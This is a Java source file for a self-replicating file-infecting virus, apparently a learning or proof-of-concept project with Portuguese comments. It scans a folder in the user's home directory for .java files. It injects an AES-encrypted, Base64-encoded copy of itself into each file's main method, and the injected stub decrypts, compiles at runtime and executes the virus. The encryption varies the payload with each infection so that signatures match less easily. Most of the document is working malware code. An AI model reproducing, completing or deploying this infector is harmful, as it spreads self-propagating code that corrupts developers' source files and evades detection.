// VIRUS:START
public class Virus {
    static void execute(String virus){
        var curPath = java.nio.file.Paths.get(java.lang.System.getProperty("user.home"),"virus"); // Pasta alvo; Virus infecta apenas os arquivos nessa pasta. -- Não visita pastas aninhadas --;
        try (var stream = java.nio.file.Files.newDirectoryStream(curPath)) {
            var matcher = java.nio.file.FileSystems.getDefault().getPathMatcher("glob:*.java");
 
            for (java.nio.file.Path entry : stream) {
                if (matcher.matches(entry.getFileName()) && java.nio.file.Files.isWritable(entry)) {
                    var tempFile = java.nio.file.Files.createFile(java.nio.file.Path.of(entry + ".infected"));
                    var targetFile = java.nio.file.Files.newBufferedReader(entry).readAllAsString();
                    // TODO: Update this; copy line by line, IF $currentLine CONTAINS main(){ OR main(String[] args){ THEN inject $payload.
                    var beginIndexOfMain = targetFile.lastIndexOf("void main");
                    java.nio.file.Files.writeString(tempFile, targetFile.substring(0, beginIndexOfMain));
                    targetFile = targetFile.substring(targetFile.indexOf("{", beginIndexOfMain));
                    int bracketCount = 0; // Isso procura o fim do metodo main() no $arquivoAlvo; No final do loop o valor de $i é o índice do último '}' em main, i.e. o fim da função.
                    for (var i = 0; i < targetFile.length(); i++) { // TODO: targetFile might not have a main() function .. targetFile main() may throw exceptions
                        if (targetFile.charAt(i) == '{'){
                            bracketCount += 1;
                        } else if (targetFile.charAt(i) == '}') {
                            bracketCount -= 1;
                        }
                        if (bracketCount <= 0) {
                            bracketCount = i;
                            break;
                        }
                    }
                    var sb = new StringBuilder(encryptedVirus(virus));
                    sb.insert(sb.lastIndexOf("// VIRUS:END") + "// VIRUS:END".length(), "\n\t" + targetFile.substring(1, bracketCount));
                    sb.append("\n");
                    java.nio.file.Files.writeString(tempFile, sb.toString(), java.nio.file.StandardOpenOption.APPEND);
                    java.nio.file.Files.writeString(tempFile, targetFile.substring(bracketCount + 1), java.nio.file.StandardOpenOption.APPEND);
                    // java.nio.file.Files.delete(entry);
                    // java.nio.file.Files.move(tempFile, entry);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
 
    static String encryptedVirus(String virus) throws java.security.NoSuchAlgorithmException, javax.crypto.NoSuchPaddingException, javax.crypto.BadPaddingException, java.security.InvalidKeyException, java.security.InvalidAlgorithmParameterException, javax.crypto.IllegalBlockSizeException {
        var key = javax.crypto.KeyGenerator.getInstance("AES").generateKey();
        var iv = new byte[16];
        new java.security.SecureRandom().nextBytes(iv);
        var cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, key, new javax.crypto.spec.IvParameterSpec(iv));
 
        var encryptedVirus = cipher.doFinal(virus.getBytes());
        var encodedVirus = java.util.Base64.getEncoder().encodeToString(encryptedVirus);
        var encodedIv = java.util.Base64.getEncoder().encodeToString(iv);
        var encodedKey = java.util.Base64.getEncoder().encodeToString(key.getEncoded());
 
        var payload = """
        // VIRUS:START
        void main(){
            try {
                var encodedVirus = "%s";
                var iv = "%s";
                var key = "%s";
                var cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding");
                cipher.init(javax.crypto.Cipher.DECRYPT_MODE, new javax.crypto.spec.SecretKeySpec(java.util.Base64.getDecoder().decode(key), "AES"), new javax.crypto.spec.IvParameterSpec(java.util.Base64.getDecoder().decode(iv)));
                var virus = new String(cipher.doFinal(java.util.Base64.getDecoder().decode(encodedVirus)), java.nio.charset.Charset.forName("utf-8"));
                var path = java.nio.file.Paths.get(java.lang.System.getProperty("user.home"));
                var className = "Virus";
                var compiler = javax.tools.ToolProvider.getSystemJavaCompiler();
                var task = compiler.getTask(null,
                            null,
                            null,
                            java.util.List.of("-d", path.toString()),
                            null,
                            java.util.List.of(javax.tools.SimpleJavaFileObject.forSource(java.net.URI.create(className + ".java"), virus)));
                task.call();
 
                var cLoader = new java.net.URLClassLoader(new java.net.URL[] {path.toUri().toURL()}, java.lang.Thread.currentThread().getContextClassLoader());
                var loadedClass = cLoader.loadClass(className);
                var method = loadedClass.getMethod("main", java.lang.String[].class);
                method.setAccessible(true);
                method.invoke(null, (java.lang.Object) new java.lang.String[]{virus});
                java.nio.file.Files.delete(path.resolve(className + ".class"));
                cLoader.close();
            } catch (java.lang.Exception e) {
                e.printStackTrace();
            }
        // VIRUS:END
        }
        """.formatted(encodedVirus, encodedIv, encodedKey);
 
        return payload;
    }

    public static void main(String[] args) {
        try {
            String virus = "";
            if (args.length >= 1){
                virus = args[0];
            } else {
                virus = java.nio.file.Files.newBufferedReader(java.nio.file.Paths.get(Virus.class.getProtectionDomain().getCodeSource().getLocation().getFile())).readAllAsString();
            }
            virus = virus.substring(virus.indexOf("// VIRUS:START"));
            virus = virus.substring(0, virus.lastIndexOf("// VIRUS:END") + "// VIRUS:END".length());
            execute(virus);
        } catch (java.io.IOException e) {
            e.printStackTrace();
        }
    }
}
// VIRUS:END